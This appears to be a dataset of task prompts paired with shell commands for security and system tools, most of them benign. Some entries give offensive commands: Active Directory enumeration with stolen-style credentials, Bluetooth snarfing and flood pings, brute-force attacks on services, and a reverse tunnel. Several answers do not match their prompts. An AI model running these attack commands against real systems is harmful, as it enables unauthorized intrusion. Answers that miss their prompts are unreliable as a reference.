{"input": "Collect all possible data from the domain 'corp.local' using BloodHound, including group membership, session information, and ACLs, and save the results to 'corp_data.json'.\"", "answer": "bloodhound-python -d corp.local -c Group,Session,ACL -o corp_data.json"}
{"input": "Run BloodHound with all collection methods against the domain 'testdomain.com' and save the output to 'testdomain_data.json'.\"", "answer": "bloodhound-python -d testdomain.com -c All -o testdomain_data.json"}
{"input": "Use BloodHound to collect all available data from the domain 'company.local' and save the output to 'company_data.json'.\"", "answer": "bloodhound-python -d company.local -c All -o company_data.json"}
{"input": "Run BloodHound with all collection methods on the domain 'mydomain.net' and save the results to 'mydomain_data.json'.\"", "answer": "bloodhound-python -d mydomain.net -c All -o mydomain_data.json"}
{"input": "Collect all possible data from the domain 'internal.local' using BloodHound and save the output to 'internal_data.json'.\"", "answer": "bloodhound-python -d internal.local -c All -o internal_data.json"}
{"input": "Run BloodHound with all collection methods against the domain 'test.local' and save the output to 'test_data.json'.\"", "answer": "bloodhound-python -d test.local -c All -o test_data.json"}
{"input": "Use BloodHound to collect all available data from the domain 'corp.net' and save the output to 'corp_net_data.json'.\"", "answer": "bloodhound-python -d corp.net -c All -o corp_net_data.json"}
{"input": "Collect all available data from the domain \"example.com\" using BloodHound-Python, and authenticate with the username \"admin\" and password \"Password123\"", "answer": "bloodhound-python -d example.com -u admin -p Password123 -c All"}
{"input": "Gather all data from the domain \"example.org\" using BloodHound-Python, authenticate with the username \"admin\" and AES key \"1234567890abcdef1234567890abcdef\", and save the output files with the prefix \"example_\"", "answer": "bloodhound-python -d example.org -u admin -aesKey 1234567890abcdef1234567890abcdef -c All -op example_"}
{"input": "Use BloodHound-Python to collect all data from the domain \"ad.local\" with the username \"admin\" and NTLM hashes \"LMHASH:NTHASH\", and exclude domain controllers during enumeration", "answer": "bloodhound-python -d ad.local -u admin --hashes LMHASH:NTHASH -c All --exclude-dcs"}
{"input": "Collect all data from the domain \"test.local\" using BloodHound-Python, authenticate with the username \"user3\" and password \"Password123\", and use LDAP over TLS (LDAPS) for queries", "answer": "bloodhound-python -d test.local -u user3 -p Password123 -c All --use-ldaps"}
{"input": "Collect all data from the domain \"example.org\" using BloodHound-Python, authenticate with the username \"user4\" and password \"SecurePass123\", and override the domain controller to \"dc1.example.org\"", "answer": "bloodhound-python -d example.org -u user4 -p SecurePass123 -c All -dc dc1.example.org"}
{"input": "Run BlueHydra without saving results to a database, keeping everything in RAM", "answer": "blue_hydra --no-db"}
{"input": "Send a custom AT command \"AT+CPBR=1\" to a Bluetooth device with address 33:44:55:66:77:88", "answer": "bluesnarfer -b 33:44:55:66:77:88 -c AT+CPBR=1"}
{"input": "Reset the Bluetooth controller using bluemoon", "answer": "sudo systemctl restart bluetooth"}
{"input": "Use the second Bluetooth controller (index 1) to perform a reset using bluemoon", "answer": "bluemoon -i 1 -R"}
{"input": "Load a firmware file named `new_firmware.bin` onto the first Bluetooth controller (index 0) using bluemoon", "answer": "bluemoon -i 0 -F new_firmware.bin"}
{"input": "Remove the Bluetooth device with the address `00:1A:7D:DA:71:17` from the system", "answer": "bluetoothctl remove 00:1A:7D:DA:71:17"}
{"input": "Attach a Bluetooth Primary controller using the BR/EDR protocol on device `/dev/ttyUSB0` with a baud rate of 115200 and disable flow control", "answer": "btattach -B /dev/ttyUSB0 -P bredr -S 115200 -N"}
{"input": "Attach an AMP controller to the device `/dev/ttyAMA0` using the H4 protocol with a baud rate of 9600", "answer": "btattach -A /dev/ttyAMA0 -P h4 -S 9600"}
{"input": "Attach a Bluetooth Primary controller to `/dev/ttyS1` using the BCSP protocol with a baud rate of 57600 and ensure flow control is disabled", "answer": "btattach -B /dev/ttyS1 -P bcsp -S 57600 -N"}
{"input": "Attach an AMP controller to `/dev/ttyS0` using the H4 protocol with a baud rate of 115200 and disable flow control", "answer": "btattach -A /dev/ttyS0 -P h4 -S 115200 -N"}
{"input": "Attach a Bluetooth Primary controller to `/dev/ttyUSB2` using the H4 protocol with a baud rate of 19200", "answer": "btattach -B /dev/ttyUSB2 -P h4 -S 19200"}
{"input": "Attach an AMP controller to `/dev/ttyUSB3` using the BCSP protocol with a baud rate of 57600 and ensure flow control is disabled", "answer": "btattach -A /dev/ttyUSB3 -P bcsp -S 57600 -N"}
{"input": "Attach a Bluetooth Primary controller to `/dev/ttyS2` using the H5 protocol with a baud rate of 9600 and disable flow control", "answer": "btattach -B /dev/ttyS2 -P h5 -S 9600 -N"}
{"input": "Attach an AMP controller to `/dev/ttyUSB4` using the H4 protocol with a baud rate of 115200", "answer": "btattach -A /dev/ttyUSB4 -P h4 -S 115200"}
{"input": "Attach a Bluetooth Primary controller to `/dev/ttyS3` using the BCSP protocol with a baud rate of 38400 and disable flow control", "answer": "btattach -B /dev/ttyS3 -P bcsp -S 38400 -N"}
{"input": "Toggle the Bluetooth adapter's powered state to on", "answer": "btmgmt power on"}
{"input": "Enable Low Energy (LE) support on the Bluetooth adapter", "answer": "btmgmt le on"}
{"input": "Disable BR/EDR support on the Bluetooth adapter", "answer": "btmgmt bredr off"}
{"input": "Unpair the device with the address 00:11:22:33:44:55", "answer": "btmgmt unpair 00:11:22:33:44:55"}
{"input": "Clear all UUIDs from the Bluetooth adapter", "answer": "btmgmt clr-uuids"}
{"input": "Set the appearance of the Bluetooth adapter to \"Phone\"", "answer": "btmgmt appearance 64"}
{"input": "Start a Bluetooth monitor server on a Unix socket named `/tmp/btmon_socket`", "answer": "btmon -s /tmp/btmon_socket"}
{"input": "Monitor Bluetooth management events and show both time and date information", "answer": "btmon -M -T"}
{"input": "Dump A2DP stream traffic from a specific controller with index 1 and set the default company identifier to 0x004C (Apple)", "answer": "btmon -i 1 -A -V 0x004C"}
{"input": "Display help information for the `ciptool` command", "answer": "ciptool -h"}
{"input": "Attach a Bluetooth device connected to the UART interface at `/dev/ttyS0` using the HCI protocol, with a baud rate of 115200, and enable hardware flow control", "answer": "hciattach /dev/ttyS0 hci 115200 flow"}
{"input": "Attach a Bluetooth device at `/dev/ttyUSB1` with the `bcm2035` type, set the initial speed to 57600, and disable hardware flow control", "answer": "hciattach /dev/ttyUSB1 bcm2035 57600 noflow"}
{"input": "Attach a Bluetooth device at `/dev/ttyS1` with the `qualcomm` type, set the speed to 460800, disable hardware flow control, and enable sleep mode", "answer": "hciattach /dev/ttyS1 qualcomm 460800 noflow sleep"}
{"input": "List all supported HCI UART types and their corresponding IDs", "answer": "hciattach -l"}
{"input": "Attach a Bluetooth device at `/dev/ttyUSB3` with the `bluecard` type, set the speed to 19200, enable hardware flow control, and specify a Bluetooth address of `AA:BB:CC:DD:EE:FF`", "answer": "hciattach /dev/ttyUSB3 bluecard 19200 flow AA:BB:CC:DD:EE:FF"}
{"input": "Set the local name of the Bluetooth device `hci0` to \"MyDevice\"", "answer": "hciconfig hci0 name MyDevice"}
{"input": "Set the inquiry transmit power level to 10 for the Bluetooth device `hci0`", "answer": "hciconfig hci0 inqtpl 10"}
{"input": "Add the device with address `00:11:22:33:44:55` to the reject list on the Bluetooth device `hci0`", "answer": "bluetoothctl block 00:11:22:33:44:55"}
{"input": "Set the page timeout to 2000 on the Bluetooth device `hci0`", "answer": "hciconfig hci0 pageto 2000"}
{"input": "Set the default link policy to \"Hold\" on the Bluetooth device `hci0`", "answer": "hciconfig hci0 lp hold"}
{"input": "Retrieve detailed information about a remote Bluetooth device with the MAC address 00:11:22:33:44:55", "answer": "bluetoothctl info 00:11:22:33:44:55"}
{"input": "Display the link quality of the connection to a remote Bluetooth device with the MAC address 00:11:22:33:44:55", "answer": "hcitool lq 00:11:22:33:44:55"}
{"input": "Convert the Broadcom Bluetooth firmware file `firmware.hex` to an HCD file and save the output as `firmware.hcd`", "answer": "hex2hcd -o firmware.hcd firmware.hex"}
{"input": "Convert the Broadcom Bluetooth firmware file `firmware_v2.hex` to an HCD file and save it as `firmware_v2_converted.hcd` in the `/var/lib/firmware` directory", "answer": "hex2hcd -o /var/lib/firmware/firmware_v2_converted.hcd firmware_v2.hex"}
{"input": "Convert the Broadcom Bluetooth firmware file `legacy.hex` to an HCD file and save it as `legacy_converted.hcd` in the `/opt/firmware` directory", "answer": "hex2hcd -o /opt/firmware/legacy_converted.hcd legacy.hex"}
{"input": "Send a flood of L2CAP echo requests to the Bluetooth device with address 00:11:22:33:44:55 without any delay between requests", "answer": "l2ping -f 00:11:22:33:44:55"}
{"input": "Flood ping the Bluetooth device with address 66:77:88:99:AA:BB using the Bluetooth interface hci1 and verify the payload of the requests and responses", "answer": "l2ping -i hci1 -f -v 66:77:88:99:AA:BB"}
{"input": "Retrieve a file named \"image.jpg\" from a remote device using OBEX", "answer": "obexftp -b <remote_device_address> -g image.jpg"}
{"input": "Browse all available Bluetooth services on the default interface using sdptool", "answer": "sdptool browse local"}
{"input": "Search for the \"DUN\" (Dial-Up Networking) service on the Bluetooth interface hci0 using sdptool", "answer": "sdptool -i hci0 search DUN"}
{"input": "Import an externally provisioned remote node from the file `node_import.json` and list all remote mesh nodes afterward", "answer": "mesh-cfgclient node-import node_import.json && mesh-cfgclient list-nodes"}
{"input": "Display the version of the `mesh-cfgclient` tool and show the help menu for additional options", "answer": "mesh-cfgclient --version && mesh-cfgclient --help"}
{"input": "List all tests in the mesh-cfgtest tool and then run only those that contain the string \"performance\"", "answer": "mesh-cfgtest --list | grep performance | xargs -I {} mesh-cfgtest --run {}"}
{"input": "Set up a Bluetooth emulator with a BR/EDR-only controller and create a local serial port", "answer": "btvirt -B -S"}
{"input": "Start a Bluetooth emulator with a LE-only controller and 4 local controllers", "answer": "btvirt -L -l4"}
{"input": "Launch a Bluetooth emulator with debug mode, 2 local controllers, and a BR/EDR-only controller", "answer": "btvirt -d -l2 -B"}
{"input": "Start a Bluetooth emulator with a LE-only controller, 5 local controllers, and enable local server sockets", "answer": "btvirt -L -l5 -s"}
{"input": "List all available tests in ioctl-tester without running them", "answer": "ioctl-tester -l"}
{"input": "Run all tests in ioctl-tester that match the prefix \"net_\"", "answer": "ioctl-tester -p net_"}
{"input": "Run tests in iso-tester that match the prefix \"network_\"", "answer": "iso-tester -p network_"}
{"input": "Reconnect to a Bluetooth device with the address \"00:11:22:33:44:55\" using isotest", "answer": "bluetoothctl connect 00:11:22:33:44:55"}
{"input": "Reconnect to a Bluetooth device with the address \"00:11:22:33:44:55\" and continue the operation without stopping", "answer": "bluetoothctl connect 00:11:22:33:44:55"}
{"input": "Reconnect to a Bluetooth device with the address \"00:11:22:33:44:55\" using a latency of 100 milliseconds", "answer": "bluetoothctl connect 00:11:22:33:44:55"}
{"input": "List all the tests that mesh-tester can run without executing them", "answer": "mesh-tester -l"}
{"input": "Run tests in mesh-tester that match the prefix \"network_\"", "answer": "mesh-tester -p network_"}
{"input": "Run all tests in mesh-tester with both debug and monitor output enabled", "answer": "mesh-tester -d -m"}
{"input": "Run tests in mesh-tester quietly and only list the tests that would be executed", "answer": "mesh-tester -q -l"}
{"input": "List all available tests in the mgmt-tester tool without running them", "answer": "mgmt-tester -l"}
{"input": "Run all tests in the mgmt-tester tool quietly and list the tests to be run beforehand", "answer": "mgmt-tester -q -l"}
{"input": "Run all tests in the sco-tester tool quietly, without logging any output", "answer": "sco-tester -q > /dev/null 2>&1"}
{"input": "Run all tests in the sco-tester tool that match the prefix \"kernel_\"", "answer": "sco-tester -p kernel_"}
{"input": "List all the tests that smp-tester can run without executing them", "answer": "smp-tester -l"}
{"input": "Run all tests in smp-tester with both debug and monitor output enabled", "answer": "smp-tester -d -m"}
{"input": "Run all tests in smp-tester quietly and list the tests without executing them", "answer": "smp-tester -q -l"}
{"input": "List all the tests available in the userchan-tester tool without running them", "answer": "userchan-tester -l"}
{"input": "Run tests in the userchan-tester tool that match the prefix \"hci\" and enable monitor output", "answer": "userchan-tester -p hci -m"}
{"input": "Run all tests in the userchan-tester tool with both debug and monitor output enabled", "answer": "userchan-tester -d -m"}
{"input": "Run all tests in the userchan-tester tool without any logging or debug output", "answer": "userchan-tester -q"}
{"input": "Run tests in the userchan-tester tool that match the prefix \"kernel\" and enable debug output", "answer": "userchan-tester -p kernel -d"}
{"input": "Load SNMP queries from a file named \"queries.txt\" and perform them on the IP range 10.129.228.1 to 10.129.228.255, with a timeout of 3 seconds and a retry count of 4", "answer": "braa -t 3 -r 4 -f queries.txt 10.129.228.1-10.129.228.255"}
{"input": "Process the specific PCAP files `file1.pcap` and `file2.pcap` using BruteSharkCLI to extract files and generate a network map, saving the results to `/home/user/output`", "answer": "brutesharkcli -i file1.pcap,file2.pcap -m FileExtracting,NetworkMap -o /home/user/output"}
{"input": "Process all PCAP files in `/var/log/pcaps` using BruteSharkCLI to extract credentials, DNS, and VoIP data, and save the results to `/var/log/results`", "answer": "brutesharkcli -d /var/log/pcaps -m Credentials,DNS,Voip -o /var/log/results"}
{"input": "Process the PCAP file `capture.pcap` using BruteSharkCLI to extract credentials and DNS data, and save the results to `/home/user/analysis`", "answer": "brutesharkcli -i capture.pcap -m Credentials,DNS -o /home/user/analysis"}
{"input": "Perform a bruteforce attack on all services detected in the Nmap scan results stored in `scan_results.xml` using the username list `users.txt` and password list `passwords.txt`", "answer": "brutespray -f scan_results.xml -u users.txt -p passwords.txt -s all"}
{"input": "Parse the Nessus scan results from `nessus_scan.xml`, bruteforce all services using the combo wordlist `user:pass`, and use 15 threads for the attack", "answer": "brutespray -f nessus_scan.xml -C user:pass -s all -t 15"}
{"input": "Analyze the disk image \"evidence.img\" and disable the \"email\" and \"pdf\" scanners while saving the results to \"results_dir\"", "answer": "bulk_extractor -o results_dir -x email -x pdf evidence.img"}
{"input": "Scan the disk image \"data.img\" and enable the \"wordlist\" scanner with a minimum word size of 6 and a maximum word size of 16. Save the output to \"wordlist_output\"", "answer": "bulk_extractor -o wordlist_output -e wordlist -S word_min=6 -S word_max=16 data.img"}
{"input": "Process the disk image \"forensic.img\" and set the maximum recursion depth to 20. Output the results to \"forensic_output\"", "answer": "bulk_extractor -o forensic_output -M 20 forensic.img"}
{"input": "Analyze the disk image \"system.img\" and enable the \"xor\" scanner with a XOR mask value of 255. Save the results to \"xor_results\"", "answer": "bulk_extractor -o xor_results -e xor -S xor_mask=255 system.img"}
{"input": "Scan the disk image \"archive.img\" and disable all scanners except the \"zip\" scanner. Save the output to \"zip_scan\"", "answer": "bulk_extractor -o zip_scan -x all -E zip archive.img"}
{"input": "Analyze the disk image \"disk2.img\" and set the page size to 32 MB and the margin size to 8 MB. Save the output to \"disk2_output\"", "answer": "bulk_extractor -o disk2_output -G 33554432 -g 8388608 disk2.img"}
{"input": "Analyze the disk image \"evidence2.img\" and read patterns to search from a file named \"patterns.txt\". Save the output to \"evidence2_output\"", "answer": "bulk_extractor -o evidence2_output -F patterns.txt evidence2.img"}
{"input": "Analyze the disk image \"disk3.img\" and enable the \"base16\" scanner. Save the output to \"base16_results\"", "answer": "bulk_extractor -o base16_results -e base16 disk3.img"}
{"input": "Process the disk image \"archive2.img\" and set the carve mode for JPEG files to mode 2 (carve everything). Save the output to \"jpeg_carve_output\"", "answer": "bulk_extractor -o jpeg_carve_output -S jpeg_carve_mode=2 archive2.img"}
{"input": "Scan the disk image \"disk6.img\" and enable the \"outlook\" scanner. Save the output to \"outlook_results\"", "answer": "bulk_extractor -o outlook_results -e outlook disk6.img"}
{"input": "Analyze the disk image \"data4.img\" and set the context window size to 32 bytes. Save the output to \"data4_output\"", "answer": "bulk_extractor -o data4_output -C 32 data4.img"}
{"input": "Launch Burp Suite in Collaborator server mode using a custom configuration file named \"collab_config.cfg\"", "answer": "burpsuite --collaborator-server --collaborator-config collab_config.cfg"}
{"input": "Open an existing project file named \"existing_project.burp\" in Burp Suite and ensure the Spider and Scanner are not paused", "answer": "burpsuite --project-file existing_project.burp"}
{"input": "Extract all files from the cabinet archive \"archive.cab\" and make all filenames lowercase", "answer": "cabextract -L archive.cab"}
{"input": "Launch Caldera with the `sandcat` and `manx` plugins loaded, using the `development` environment file", "answer": "python3 server.py --environment development --plugins sandcat,manx"}
{"input": "Display all Calico workload endpoints in the cluster", "answer": "calicoctl get workloadendpoint --all"}
{"input": "Retrieve all Calico host endpoints across the cluster", "answer": "calicoctl get hostendpoint --all"}
{"input": "Get all Calico BGP configurations in the cluster", "answer": "calicoctl get bgpconfiguration --all"}
{"input": "Display all Calico Felix configurations in the cluster", "answer": "calicoctl get felixconfiguration --all"}
{"input": "Retrieve all Calico global network sets", "answer": "calicoctl get globalnetworkset --all"}
{"input": "List all Calico cluster information resources", "answer": "calicoctl get clusterinformation --all"}
{"input": "Show all Calico IPAM blocks in the cluster", "answer": "calicoctl get block --all"}
{"input": "Decode the hex string \"0f85feffffff\" in 64-bit x86 mode with AT&T syntax and display the instructions", "answer": "cstool x64att 0f85feffffff"}
{"input": "Decode the hex string \"a9bf7bfd\" in AArch64 mode with big-endian byte order and show the immediates as unsigned values", "answer": "cstool -u arm64be a9bf7bfd"}
{"input": "Decrypt a file named `data.cpt` using a key stored in the environment variable `SECRET_KEY`, and print progress information to the terminal", "answer": "ccdecrypt -E SECRET_KEY -v data.cpt"}
{"input": "Encrypt all files in the current directory using ccencrypt, ensuring that the tool overwrites existing files without asking for confirmation", "answer": "ccencrypt -f *"}
{"input": "Encrypt a file named \"secret.txt\" using ccencrypt, and use a custom suffix \".enc\" instead of the default \".cpt\"", "answer": "ccencrypt -S .enc secret.txt"}
{"input": "Decrypt all files with the \".cpt\" extension in the current directory using ccdecrypt, and suppress any warning messages during the process", "answer": "ccdecrypt -q *.cpt"}
{"input": "Search for ccrypt encryption keys in the file \"encrypted_data.cc\" using the approximate key \"mysecretkey\" and allow up to 5 changes to the key", "answer": "ccguess -K mysecretkey -d 5 encrypted_data.cc"}
{"input": "Decrypt the file `data.cpt` and output the result to the terminal without saving it to a file", "answer": "ccrypt -c data.cpt"}
{"input": "Perform a certificate transparency search for \"example.com\" including subdomains, with a parallel retrieval of 20 certificates, and print the version of certgraph being used", "answer": "certgraph -ct-subdomains example.com -parallel 20 && certgraph -version"}
{"input": "Generate a wordlist from \"https://example.com\" and write the output to a file named \"wordlist.txt\", while also including email addresses found on the site", "answer": "cewl -w wordlist.txt -e https://example.com"}
{"input": "Generate a wordlist from \"https://example.com\" using a proxy at \"192.168.1.1\" on port 8080, with proxy authentication using username \"proxyuser\" and password \"proxypass\"", "answer": "cewl --proxy_host 192.168.1.1 --proxy_port 8080 --proxy_username proxyuser --proxy_password proxypass https://example.com"}
{"input": "Extract metadata from a single file named \"document.pdf\" using fab-cewl in verbose mode", "answer": "exiftool -v document.pdf"}
{"input": "Extract metadata from a file named \"data.xlsx\" using fab-cewl and enable verbose output to see detailed processing information", "answer": "exiftool -v data.xlsx"}
{"input": "Extract metadata from a file named \"presentation.pptx\" and ensure the output is displayed in a verbose manner", "answer": "exiftool -v presentation.pptx"}
{"input": "Extract metadata from a file named \"image.jpg\" using fab-cewl and enable verbose mode to see detailed processing steps", "answer": "exiftool -v image.jpg"}
{"input": "Search for the case-insensitive keyword \"mimikatz\" in the forensic artefacts located in the directory `evtx_samples/`", "answer": "chainsaw search mimikatz -i evtx_samples/"}
{"input": "Perform a hunt through forensic artefacts in `evtx_samples/` using Sigma rules from `sigma_rules/`, map them with `sigma-event-logs-all.yml`, and output the results in JSON format", "answer": "chainsaw hunt evtx_samples/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml --json"}
{"input": "Hunt through forensic artefacts in `evtx_samples/` using Sigma rules from `sigma_rules/`, map them with `sigma-event-logs-all.yml`, and limit the number of threads to 4", "answer": "chainsaw hunt evtx_samples/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml --num-threads 4"}
{"input": "Search for the keyword \"malware\" in the forensic artefacts located in `evtx_samples/` and print verbose output", "answer": "chainsaw search malware evtx_samples/ -v"}
{"input": "Perform a hunt through forensic artefacts in `evtx_samples/` using Sigma rules from `sigma_rules/`, map them with `sigma-event-logs-all.yml`, and hide Chainsaw's banner", "answer": "chainsaw hunt evtx_samples/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml --no-banner"}
{"input": "Search for the keyword \"ransomware\" in the forensic artefacts located in `evtx_samples/` and print the version of Chainsaw being used", "answer": "chainsaw search ransomware evtx_samples/ -V"}
{"input": "Analyze the network capture file `capture1.pcap` and generate HTML files for all detected sessions, including hex dumps and raw data", "answer": "chaosreader -e -H -r capture1.pcap"}
{"input": "Open a CherryTree file \"/home/user/ideas.ctb\" and jump directly to the node named \"Brainstorming\"", "answer": "cherrytree /home/user/ideas.ctb -n Brainstorming"}
{"input": "Set the DTCS code for memory location 25 to 023 using chirpc", "answer": "chirpc --set-mem-dtcs 25 023"}
{"input": "List all available radio models supported by chirpc", "answer": "chirpc --list-radios"}
{"input": "Log all chirpc operations to a file named \"chirpc_log.txt\" with a log level of \"info.\"", "answer": "chirpc --log chirpc_log.txt --log-level info"}
{"input": "Open ChirpW and immediately start a new radio configuration file", "answer": "chirpw"}
{"input": "Run ChirpW in verbose mode and log all messages to 'chirpw_log.txt'", "answer": "chirpw --verbose > chirpw_log.txt 2>&1"}
{"input": "Connect to a Chisel server at 10.10.10.10 on port 8080 and forward local port 5000 to remote port 22 using a reverse tunnel", "answer": "chisel client 10.10.10.10:8080 R:5000:localhost:22"}
{"input": "Start a Chisel server on port 8080 with verbose logging enabled", "answer": "chisel server --port 8080 -v"}
{"input": "Connect to a Chisel server at 192.168.1.100 on port 8080 and forward local port 4000 to remote port 443, while also enabling compression for the connection", "answer": "chisel client 192.168.1.100:8080 4000:443 --compress"}
{"input": "Use a custom root directory for the chkrootkit scan", "answer": "chkrootkit -r /custom/root/dir"}
{"input": "Manually trigger a rootkit check using chkrootkit-daily outside of the scheduled daily run", "answer": "sudo chkrootkit"}
{"input": "Start Chromium with a temporary profile for a one-time session that won\u2019t save any user data", "answer": "chromium --incognito"}
{"input": "Launch Chromium with a specific proxy server `socks5://proxy.example.com:1080` for all requests", "answer": "chromium --proxy-server=\"socks5://proxy.example.com:1080\""}
{"input": "Disable the proxy server in Chromium and override any existing proxy settings", "answer": "chromium --no-proxy-server"}
{"input": "Launch Chromium with a proxy auto-configuration (PAC) URL set to `http://example.com/proxy.pac`", "answer": "chromium --proxy-pac-url=http://example.com/proxy.pac"}
{"input": "Open Chromium in debug mode using GDB for troubleshooting", "answer": "gdb --args chromium"}
{"input": "Start ChromeDriver on port 9515 and log all activity to a file named `chromedriver.log`", "answer": "chromedriver --port=9515 --log-path=chromedriver.log --log-level=ALL"}
{"input": "Launch ChromeDriver with readable timestamps in the logs and allow connections only from the IP addresses 192.168.1.1 and 192.168.1.2", "answer": "chromedriver --readable-timestamp --allowed-ips=192.168.1.1,192.168.1.2"}
{"input": "Run ChromeDriver with browser logs enabled and disable the use of `/dev/shm` to avoid shared memory errors", "answer": "chromedriver --enable-chrome-logs --disable-dev-shm-usage"}
{"input": "Start Chromium with all security policies enforced, including strict mixed content blocking and certificate transparency", "answer": "chromium --enable-strict-mixed-content-checking --enable-certificate-transparency"}
{"input": "Mount a CIFS share located at `//192.168.1.100/shared` to the local directory `/mnt/shared` using the username `admin`, password `secret`, and domain `WORKGROUP`", "answer": "mount.cifs //192.168.1.100/shared /mnt/shared -o user=admin,pass=secret,dom=WORKGROUP"}
{"input": "Mount a CIFS share at `//10.0.0.5/data` to `/mnt/data` with read-only permissions and using the SMB version 3.0", "answer": "mount.cifs //10.0.0.5/data /mnt/data -o ro,vers=3.0"}
{"input": "Mount a CIFS share located at `//fileserver/docs` to `/mnt/docs` using a credentials file located at `/etc/cifs-credentials`", "answer": "mount.cifs //fileserver/docs /mnt/docs -o credentials=/etc/cifs-credentials"}
{"input": "Mount a CIFS share at `//192.168.10.20/media` to `/mnt/media` with file permissions set to `755` and directory permissions set to `775`", "answer": "mount.cifs //192.168.10.20/media /mnt/media -o file_mode=0755,dir_mode=0775"}
{"input": "Mount a CIFS share located at `//samba/files` to `/mnt/files` with guest access and no Unix extensions", "answer": "mount.cifs //samba/files /mnt/files -o guest,nounix"}
{"input": "Mount a CIFS share at `//10.10.10.10/backup` to `/mnt/backup` with a custom I/O character set of `utf8` and a read/write buffer size of 64KB", "answer": "mount.cifs //10.10.10.10/backup /mnt/backup -o iocharset=utf8,rsize=65536,wsize=65536"}
{"input": "Mount a CIFS share located at `//192.168.2.30/projects` to `/mnt/projects` with persistent handles and resilient handles enabled", "answer": "mount.cifs //192.168.2.30/projects /mnt/projects -o persistenthandles,resilienthandles"}
{"input": "Mount a CIFS share located at `//192.168.5.10/music` to `/mnt/music` with case-insensitive file names and no POSIX path handling", "answer": "mount.cifs //192.168.5.10/music /mnt/music -o ignorecase,noposixpaths"}
{"input": "Set the group of the file \"shared.doc\" to the group \"Managers\" using their Security Identifier (SID)", "answer": "chgrp Managers shared.doc"}
{"input": "Collect a system dump for troubleshooting Cilium and Hubble issues, saving the output to \"/tmp/cilium-sysdump\"", "answer": "cilium sysdump --output-directory /tmp/cilium-sysdump"}
{"input": "Upgrade the Cilium installation in the Kubernetes cluster using the Helm release name \"my-cilium\"", "answer": "helm upgrade my-cilium cilium/cilium --namespace kube-system"}
{"input": "Concatenate `file1.txt` and `file2.txt` while suppressing repeated empty lines in the output", "answer": "cat -s file1.txt file2.txt"}
{"input": "Display the help menu for cisco7crack to understand its usage and options", "answer": "cisco7crack -h"}
{"input": "Analyze the bytecode file \"malware.bc\" using the clambc tool, forcing the interpreter instead of the JIT, and print the bytecode source", "answer": "clambc --force-interpreter --printsrc malware.bc"}
{"input": "Analyze the bytecode file \"sample.bc\" using clambc, disable source line display during tracing, and set the trace level to 3", "answer": "clambc --no-trace-showsource --trace 3 sample.bc"}
{"input": "Scan the directory `/home/user/downloads` for viruses and move any infected files to the directory `/home/user/quarantine`", "answer": "clamscan --move=/home/user/quarantine /home/user/downloads"}
{"input": "Scan the file `data.tar.gz` for viruses and create temporary files in the directory `/tmp/clamav` during the scan", "answer": "clamscan --tempdir=/tmp/clamav data.tar.gz"}
{"input": "Submit a false positive file named \"suspicious_file.exe\" detected as \"Trojan.Generic\" to ClamAV, using the email \"user@example.com\" and the name \"John Doe\"", "answer": "clamsubmit -p suspicious_file.exe -V \"Trojan.Generic\" -e user@example.com -N \"John Doe\""}
{"input": "Submit a false negative file named \"malware_sample.bin\" to ClamAV, using the email \"analyst@security.com\" and the name \"Jane Smith\"", "answer": "clamsubmit -n malware_sample.bin -e analyst@security.com -N \"Jane Smith\""}
{"input": "Submit a false negative file from standard input (stdin) to ClamAV, using the email \"researcher@lab.edu\" and the name \"Dr. Researcher\"", "answer": "clamsubmit -n - -e researcher@lab.edu -N \"Dr. Researcher\""}
{"input": "Submit a false positive file named \"infected_doc.docx\" detected as \"Doc.Dropper\" to ClamAV, using the email \"support@clamav.net\" and the name \"Support Team\", and enable debug output", "answer": "clamsubmit -p infected_doc.docx -V \"Doc.Dropper\" -e support@clamav.net -N \"Support Team\" -d"}
{"input": "Submit a false negative file named \"unknown_malware.bin\" to ClamAV, using the email \"analyst@company.com\" and the name \"Alex Johnson\", and enable debug output", "answer": "clamsubmit -n unknown_malware.bin -e analyst@company.com -N \"Alex Johnson\" -d"}
{"input": "Verify the integrity of a ClamAV database diff file `update.cdiff` against the database `main.cvd`", "answer": "sigtool --verify-cdiff update.cdiff main.cvd"}
{"input": "Show only the non-default configuration settings for Clam AntiVirus", "answer": "clamconf -n"}
{"input": "Generate an example configuration file named `clamd.conf.example` using clamconf", "answer": "clamconf -g clamd.conf.example"}
{"input": "Run clamd in the foreground, log output to `clamd.log`, and load virus signatures from `/var/lib/clamav`", "answer": "clamd -F -l clamd.log --datadir=/var/lib/clamav"}
{"input": "Monitor the Clam AntiVirus Daemon running on the local machine using the default configuration file", "answer": "clamdtop -c /etc/clamav/clamd.conf"}
{"input": "Monitor the Clam AntiVirus Daemon running on a remote server at IP address 192.168.1.100 on the default port 3310", "answer": "clamdtop 192.168.1.100:3310"}
{"input": "Monitor the Clam AntiVirus Daemon using a local Unix socket located at `/var/run/clamav/clamd.sock`", "answer": "clamdtop /var/run/clamav/clamd.sock"}
{"input": "Scan a directory, pass the file descriptor to clamd (useful if clamd is running as a different user), and log the output to \"fdpass_log.txt\"", "answer": "clamonacc --fdpass -l fdpass_log.txt /path/to/directory"}
{"input": "Show the help menu for `clamonacc` to view all available options", "answer": "clamonacc -h"}
{"input": "Update the ClamAV virus databases and show detailed progress during the update process", "answer": "freshclam --show-progress"}
{"input": "Run freshclam in daemon mode, logging all output to `/var/log/freshclam.log` and writing the process ID to `/var/run/freshclam.pid`", "answer": "freshclam --daemon --log=/var/log/freshclam.log --pid=/var/run/freshclam.pid"}
{"input": "Update the ClamAV virus databases, running the process as the user `clamav` and logging all output to `/var/log/freshclam.log`", "answer": "freshclam --user=clamav --log=/var/log/freshclam.log"}
{"input": "Update the ClamAV virus databases, but only perform 5 checks per day for updates", "answer": "freshclam --checks=5"}
{"input": "Update the ClamAV virus databases, and if the software is outdated, execute the script `/usr/local/bin/update_software.sh`", "answer": "freshclam --on-outdated-execute=/usr/local/bin/update_software.sh"}
{"input": "Update the ClamAV virus databases, and download the new databases into the directory `/var/lib/clamav`", "answer": "freshclam --datadir=/var/lib/clamav"}
{"input": "Start the ClamAV Milter mail scanner using a custom configuration file located at `/etc/clamav-milter.conf`", "answer": "clamav-milter -c /etc/clamav-milter.conf"}
{"input": "Run the ClamAV Milter mail scanner and write the process ID (PID) to a file located at `/var/run/clamav-milter.pid`", "answer": "clamav-milter -p /var/run/clamav-milter.pid"}
{"input": "Scan all files in the current directory for viruses using clamdscan, and only display the names of infected files", "answer": "clamdscan --infected ."}
{"input": "Retrieve both the library linking information and compiler flags for libclamav in a single command", "answer": "clamav-config --libs --cflags"}
